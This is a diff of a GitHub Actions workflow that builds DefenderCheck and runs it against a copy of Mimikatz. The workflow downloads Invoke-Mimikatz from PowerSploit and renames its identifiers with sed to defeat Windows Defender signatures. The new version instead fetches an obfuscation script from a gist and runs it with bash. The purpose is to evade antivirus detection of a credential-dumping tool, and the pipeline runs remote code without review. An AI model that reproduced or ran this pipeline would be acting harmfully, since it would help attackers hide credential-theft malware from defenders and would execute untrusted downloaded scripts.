@@ -33,42 +33,22 @@ jobs:
       run: |
         cd "$env:GITHUB_WORKSPACE\DefenderCheck\DefenderCheck"
         msbuild DefenderCheck.sln /t:Build
-        ls
-        ls "$env:GITHUB_WORKSPACE\DefenderCheck"
-        ls "$env:GITHUB_WORKSPACE\DefenderCheck\DefenderCheck\DefenderCheck"
-
-    - name: Get Invoke-Mimikatz
+        
+    - name: Get obfuscation script
       run: |
         mkdir -p "$env:GITHUB_WORKSPACE\working"
         cd "$env:GITHUB_WORKSPACE\working"
-        iwr -uri https://github.com/PowerShellMafia/PowerSploit/raw/master/Exfiltration/Invoke-Mimikatz.ps1 -outfile "$env:GITHUB_WORKSPACE\working\Invoke-Mimikatz.ps1"
-
-    - name: Randomize
+        iwr -uri https://gist.githubusercontent.com/S3cur3Th1sSh1t/08623de0c5cc67d36d4a235cec0f5333/raw/dafbd32d1307c4ebb512e4eb7c43c7e1292bcac9/ObfuscateMimi_First.sh -outfile "$env:GITHUB_WORKSPACE\working\run.sh"
+        
+    - name: Run obfuscation script
+      shell: bash
       run: |
-        cd "$env:GITHUB_WORKSPACE\working"
-
-        sed -i -e 's/Invoke-Mimikatz/Invoke-Mimidogz/g' Invoke-Mimikatz.ps1
-        sed -i -e '/<#/,/#>/c\\' Invoke-Mimikatz.ps1
-
-        sed -i -e 's/^[[:space:]]*#.*$//g' Invoke-Mimikatz.ps1
-
-        sed -i -e 's/DumpCreds/DumpCred/g' Invoke-Mimikatz.ps1
-
-        sed -i -e 's/ArgumentPtr/NotTodayPal/g' Invoke-Mimikatz.ps1
-
-        sed -i -e 's/CallDllMainSC1/ThisIsNotTheStringYouAreLookingFor/g' Invoke-Mimikatz.ps1
-
-        sed -i -e "s/\-Win32Functions \$Win32Functions$/\-Win32Functions \$Win32Functions #\-/g" Invoke-Mimikatz.ps1
+        cd "$GITHUB_WORKSPACE\working"
+        bash run.sh
         
     - name: Check current with Defender
       run: |
         ls "$env:GITHUB_WORKSPACE\DefenderCheck\DefenderCheck\DefenderCheck\obj\Debug\DefenderCheck.exe"
-        & "$env:GITHUB_WORKSPACE\DefenderCheck\DefenderCheck\DefenderCheck\obj\Debug\DefenderCheck.exe" "$env:GITHUB_WORKSPACE\working\Invoke-Mimikatz.ps1"
-
-    - name: List directories
-      run: |
-        pwd
-        ls
-        ls  "$env:GITHUB_WORKSPACE\DefenderCheck\DefenderCheck"
-        ls  "$env:GITHUB_WORKSPACE\working"
-
+        ls "$env:GITHUB_WORKSPACE\working\windows\"
+        ls "$env:GITHUB_WORKSPACE\working\windows\Win32\"
+        & "$env:GITHUB_WORKSPACE\DefenderCheck\DefenderCheck\DefenderCheck\obj\Debug\DefenderCheck.exe" "$env:GITHUB_WORKSPACE\working\windows\Win32\mimikatz.exe"
